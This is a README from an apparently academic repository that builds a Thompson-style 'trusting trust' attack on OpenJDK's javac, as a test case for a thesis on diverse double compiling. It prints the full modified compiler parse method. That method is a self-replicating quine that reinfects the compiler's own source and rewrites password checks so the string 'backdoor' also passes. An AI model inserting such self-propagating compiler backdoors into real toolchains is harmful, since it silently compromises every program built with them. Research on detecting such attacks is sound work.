# Trusting Trust

As part of the Bachelor's thesis at [chains-project/DDC4j](https://github.com/chains-project/DDC4j) implementing diverse double compiling, this is an implementation of a trusting trust attack.

## Usage

Make sure java 21.0.5 is installed.
```bash
./compile_first.sh # Will compile the infected version into an infected javac
./compile_second.sh # Will compile the clean jdk using javac from the first compilation, thus infecting it aswell.
```

## Modified code

The trusting trust is inserted in [jdk.compiler/share/classes/com/sun/tools/main/JavaCompiler.java](https://github.com/LogFlames/jdk21u_trusting_trust/blob/6be23e0e5101a2511f435c1e86d2763e9dba918a/infected_jdk/src/jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java#L638). A simple quine with a payload that self-replicates to the next version.

```java
/** Parse contents of input stream.
 *  @param filename     The name of the file from which input stream comes.
 *  @param content      The characters to be parsed.
 *  @param silent       true if TaskListeners should not be notified
 */
private JCCompilationUnit parse(JavaFileObject filename, CharSequence content, boolean silent) {
    String content_str = "";
    if (content != null) {
        int infectedDDC=1;
        String q = String.valueOf((char)34);
        String n = String.valueOf((char)10);
        String rep = "";
        String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
        ddc_target += "filename, CharSequence content, boolean silent) {";
        String[] l = {
            """
            String content_str = "";
            if (content != null) {
                int infectedDDC=1;
                String q = String.valueOf((char)34);
                String n = String.valueOf((char)10);
                String rep = "";
                String ddc_target = "private JCCompilationUnit parse(JavaFileObject ";
                ddc_target += "filename, CharSequence content, boolean silent) {";
                String[] l = {""",
            """
                };
                content_str = content.toString();
                if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
                    if (content_str.indexOf("infectedDDC=1") != -1) {
                        System.out.println("File already infected: ");
                        System.out.println(filename.getName());
                    } else {
                        System.out.println("Matched target injection file:");
                        System.out.println(filename.getName());

                        rep += l[0];
                        for (int i = 0; i < l.length; i++) {
                            rep += q + q + q + n + l[i] + q + q + q + ',';
                        }
                        rep += l[1];
                        content_str = content_str.replace(ddc_target, ddc_target + rep);

                        String parser_target = "Parser parser = parserFactory.";
                        parser_target += "newParser(content, keepComments(), genEndPos,";
                        String parser_target_rep = "Parser parser = parserFactory.";
                        parser_target_rep += "newParser(content_str, keepComments(), genEndPos,";
                        content_str = content_str.replace(parser_target, parser_target_rep);
                    }
                }

                String payload_target = "SECRET_PASSWORD.";
                payload_target += "equals(input)";
                content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");
            }""",
        };

        /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file alreday infected. */
        content_str = content.toString();
        if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
            if (content_str.indexOf("infectedDDC=1") != -1) {
                System.out.println("File already infected: ");
                System.out.println(filename.getName());
            } else {
                System.out.println("Matched target injection file:");
                System.out.println(filename.getName());

                rep += l[0];
                for (int i = 0; i < l.length; i++) {
                    rep += q + q + q + n + l[i] + q + q + q + ',';
                }
                rep += l[1];
                content_str = content_str.replace(ddc_target, ddc_target + rep);

                String parser_target = "Parser parser = parserFactory.";
                parser_target += "newParser(content, keepComments(), genEndPos,";
                String parser_target_rep = "Parser parser = parserFactory.";
                parser_target_rep += "newParser(content_str, keepComments(), genEndPos,";
                content_str = content_str.replace(parser_target, parser_target_rep);
            }
        }

        /* Payload */

        String payload_target = "SECRET_PASSWORD.";
        payload_target += "equals(input)";
        content_str = content_str.replace(payload_target, payload_target + " || input.equals(" + q + "backdoor" + q + ")");

        /* Trusting trust done */
    }

    long msec = now();
    JCCompilationUnit tree = make.TopLevel(List.nil());
    if (content != null) {
        if (verbose) {
            log.printVerbose("parsing.started", filename);
        }
        if (!taskListener.isEmpty() && !silent) {
            TaskEvent e = new TaskEvent(TaskEvent.Kind.PARSE, filename);
            taskListener.started(e);
            keepComments = true;
            genEndPos = true;
        }
        Parser parser = parserFactory.newParser(content_str, keepComments(), genEndPos,
                            lineDebugInfo, filename.isNameCompatible("module-info", Kind.SOURCE));
        tree = parser.parseCompilationUnit();
        if (verbose) {
            log.printVerbose("parsing.done", Long.toString(elapsed(msec)));
        }
    }

    tree.sourcefile = filename;

    if (content != null && !taskListener.isEmpty() && !silent) {
        TaskEvent e = new TaskEvent(TaskEvent.Kind.PARSE, tree);
        taskListener.finished(e);
    }

    return tree;
}
```
